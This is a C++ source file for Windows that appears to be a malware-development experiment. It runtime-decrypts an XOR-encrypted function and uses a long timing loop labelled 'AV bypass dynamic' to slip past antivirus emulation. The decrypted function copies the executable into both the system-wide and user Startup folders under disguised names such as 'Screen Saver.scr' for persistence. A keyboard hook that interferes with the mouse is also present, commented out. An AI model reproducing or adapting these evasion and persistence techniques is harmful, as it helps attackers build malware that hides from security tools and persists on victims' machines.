#include <iostream>
#include <Windows.h>
#include <thread>
#include "Patchutils.h"
#include "encryption.h"
//#include "JayRagon.h"

HHOOK hookHandle = NULL;

static char patchfilesig[] =
{ 0xe8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x3d };

static char patchfilemask[] =
{ "x????xx" };

const int sigoffset = 0;

static char pass[8 + 1] = 
{ 0x44, 0x33, 0x77, 0x13, 0x43, 0x17, 0x77, 0x71 };
int setupflag = 0; // set to 1 if patchfile is called (if 1, this is the setup. If 0, this is a password-protected .exe)

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN)
        {
            if (rand() % 70 == 0)
            {
                mouse_event(0x01, 1920, 1080, 0, 0);
            }
        }
    }

    // call the next keyboard hook so that other things can function
    return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}


void EncryptedFunc()
{
	// start marker
	for (size_t i = 0x777; i < 0x777; i++) {}

	/*
	std::thread thr0([] //kbhook
	{
		HINSTANCE hInstance = GetModuleHandle(NULL);
		hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);

		if (!hookHandle) {
			std::cerr << "Failed to install hook!" << std::endl;
			exit(0xdead);
		}

		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(hookHandle);
	}); thr0.detach();
	*/

	std::thread thr1([] // persistence
	{
		char buffer[MAX_PATH] = {};
		DWORD length = GetModuleFileNameA(nullptr, buffer, MAX_PATH);

		const char* sourcePath = buffer;

		std::cout << sourcePath << '\n';

		// nosh's persistence path (requires admin to copy, but the copied file cannot have admin presets. Must be right-clicked then run with admin, NOT linker->manifest->admin)
		std::string destinationPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Screen Saver.scr";
		if (!CopyFileA(sourcePath, destinationPath.c_str(), FALSE))
		{
			std::cerr << "didnt work err: " << GetLastError() << '\n';
		}

		// another persistence path
		destinationPath = "C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DX3D_RENDER.scr";
		if (!CopyFileA(sourcePath, destinationPath.c_str(), FALSE))
		{
			std::cerr << "didnt work err: " << GetLastError() << '\n';
		}

	}); thr1.detach();



	std::cout << "function decrypted and executed\n";

	Sleep(0xFFFFFFFF);

	// end marker
	for (size_t i = 0x1000; i < 0x1000; i++) {}
}



// this method NOPs the call to itself, then it encrypts the file so that it can be decrypted at runtime.
void patchfile()
{
	setupflag = 1;

	std::fstream fileStream;

	fileStream.open("C:\\_Random\\patchmeAV.exe", std::ios::in | std::ios::out | std::ios::binary);

	size_t sigresult = SigScan(&fileStream, patchfilesig, patchfilemask, 8, 1);

	// this is the size of the call to the thing
	size_t funcsize = 5;

	std::cout << "origional: ";
	CoutBytes(&fileStream, sigresult + sigoffset, 5);

	char* nops = new char[funcsize];
	for (size_t i = 0; i < funcsize; i++)
	{
		nops[i] = '\x90';
	}

	PatchBytes(&fileStream, sigresult + sigoffset, nops, funcsize);

	delete[] nops;

	std::cout << "Patched: ";
	CoutBytes(&fileStream, sigresult + sigoffset, 5);

	std::cout << "sigscan result: 0x" << std::hex << sigresult << std::dec << '\n';

	// do some cryptographyin'
	xorpatch(&fileStream, pass);
	fileStream.close();

	return;
}



int main()
{
	patchfile();
	if (setupflag == 1) { return 0xF00D; }

	// AV bypass dynamic
	unsigned long long i = 0;
	auto duration = std::chrono::high_resolution_clock::now();
	for (; i < 1896423000000; i++)
	{
		i += i % 0xff;
	}
	auto finish = std::chrono::high_resolution_clock::now();
	std::chrono::duration<double> elapsed = finish - duration;

	std::cout << i << '\n';
	std::cout << "time taken: " << elapsed.count() << '\n';

	if (xorsigmem(pass, (uintptr_t)&EncryptedFunc) == false)
	{
		std::cout << "do some more debugging bro\n";
		return 0xdeadbeef;
	}


	std::string kjfnsd = "marker";
	if (i == 1896423000018)
	{
		EncryptedFunc();
	}

	Sleep(5000);
	return 0;
}
